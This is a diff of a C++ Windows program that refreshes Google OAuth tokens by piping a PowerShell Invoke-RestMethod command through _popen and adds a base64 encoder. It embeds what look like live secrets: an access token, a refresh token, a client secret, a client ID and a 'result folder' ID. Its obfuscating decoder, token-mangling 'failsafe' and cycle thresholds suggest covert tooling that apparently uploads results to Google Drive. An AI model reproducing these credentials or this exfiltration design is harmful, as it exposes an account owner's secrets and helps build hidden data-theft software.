@@ -1,5 +1,6 @@
 #include "MyString.h"
 #include <windows.h>
+#include <string>
 #include <stdio.h>
 #include <cmath>
 
@@ -8,15 +9,17 @@
 #define PROGRAM_CYCLE_THRESHOLD 4100 * 1000 
 #define FAILSAFE_THRESHOLD 2402 * 1000
 
-static const char bs_64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+static const char bs64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+"abcdefghijklmnopqrstuvwxyz"
+"0123456789+/";
 
 static int index = 0;
 
-static MyString g_access_token = "ya29.a0AcM612yHY7gtcQPAKq4fXAXxE17SmTO1jY9tI7oZVIGrZ_G-OvWj4QliYjHNuvli2KVz2l6HZjPLUGj1VQCCETovAVQEwo-ARdQvmokxbf3HKxMojAzY1KL3_NgMLUtCR5j7mNeqN3gFxz7YrU9R7BqgmrdMq1pLh9jepUc-aCgYKAe0SARASFQHGX2MiNFJ3Wt-aCzwIQD9qDrG1Sw0175";
-static MyString g_refresh_token = *(new MyString("1//03KFHmJ2e0jJfCgYIARAAGAMSNwF-L9Ir0gHSya9koJq8Wz0QBZVGP3s3L3tFBcvyZjEal-8jn7Sy9vBAxOZrOAi0rzUIhaItCMM"));
-static MyString g_client_secret = *(new MyString("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"));
-static MyString g_client_id = *(new MyString("1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com"));
-static MyString g_result_folder_id = "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB";
+static std::string g_access_token = "ya29.a0AcM612yHY7gtcQPAKq4fXAXxE17SmTO1jY9tI7oZVIGrZ_G-OvWj4QliYjHNuvli2KVz2l6HZjPLUGj1VQCCETovAVQEwo-ARdQvmokxbf3HKxMojAzY1KL3_NgMLUtCR5j7mNeqN3gFxz7YrU9R7BqgmrdMq1pLh9jepUc-aCgYKAe0SARASFQHGX2MiNFJ3Wt-aCzwIQD9qDrG1Sw0175";
+static std::string g_refresh_token = "1//09oUhhVa2iB2lCgYIARAAGAkSNwF-L9IrO8UGnJT_FmGIEGksK2tBMWD44J6vXWhd2zlokIdykrkwahJsxm5qgsK1121-7kIBVLY";
+static std::string g_client_secret = "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";
+static std::string g_client_id = "1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com";
+static std::string g_result_folder_id = "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB";
 static boolean g_flag = false;
 
 static DWORD expo(DWORD base, DWORD exponent) {
@@ -46,17 +49,38 @@ inline static MyString converter_64(MyString inpu) {
 
         unsigned int triple = (a << 16) | (b << 8) | c;
 
-        Cute[j++] = bs_64[(triple >> 18) & 0x3F];
-        Cute[j++] = bs_64[(triple >> 12) & 0x3F];
-        Cute[j++] = (i > length + 1) ? '=' : bs_64[(triple >> 6) & 0x3F];
-        Cute[j++] = (i > length) ? '=' : bs_64[triple & 0x3F];
+        Cute[j++] = bs64[(triple >> 18) & 0x3F];
+        Cute[j++] = bs64[(triple >> 12) & 0x3F];
+        Cute[j++] = (i > length + 1) ? '=' : bs64[(triple >> 6) & 0x3F];
+        Cute[j++] = (i > length) ? '=' : bs64[triple & 0x3F];
     }
 
     Cute[len] = '\0';
     MyString result = Cute;
     return result;
 }
-//base 64 converter
+//base 64 converter it's not working properly!!!!!!!!!!
+
+static std::string base64_encode(const std::string& input) {
+    std::string encoded;
+    int val = 0, valb = -6;
+    for (unsigned char c : input) {
+        val = (val << 8) + c;
+        valb += 8;
+        while (valb >= 0) {
+            encoded.push_back(bs64[(val >> valb) & 0x3F]);
+            valb -= 6;
+        }
+    }
+    if (valb > -6) {
+        encoded.push_back(bs64[((val << 8) >> (valb + 8)) & 0x3F]);
+    }
+    while (encoded.size() % 4) {
+        encoded.push_back('='); // Add padding if necessary
+    }
+    return encoded;
+}
+
 
 inline void decoder(char str[]) {
     str[0] += 7;
@@ -125,25 +149,24 @@ static void handleFailsafe() {
     g_refresh_token = g_refresh_token.getSubString(0, g_refresh_token.getLength() - 1);
 }
 
-static MyString setNewAccessToken() {
+static BYTE setNewAccessToken(std::string &accessToken) {
 
     char* buffer = new char[1024];
-    sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30; $response.access_token | ConvertTo-Json}catch{echo 4}\"",g_client_id.getContext(), g_client_secret.getContext(), g_refresh_token.getContext());
+    sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30;Write-Host -NoNewline $response.access_token | ConvertTo-Json}catch{echo 4}\"",g_client_id.c_str(), g_client_secret.c_str(), g_refresh_token.c_str());
 
     FILE* file = _popen(buffer, "r");
     fgets(buffer, 1023, file);
     if (buffer[0] == '4')
     {
         delete[] buffer;
-        handleFailsafe();
-        return setNewAccessToken();
+        return 400;
     }
-    MyString output = buffer;
-
     _pclose(file);
     g_flag = false;
+    accessToken = buffer;
+
     delete[] buffer;
-    return output.getSubString(1, output.getLength() - 2);
+    return 200;
 }
 // Get Token
 
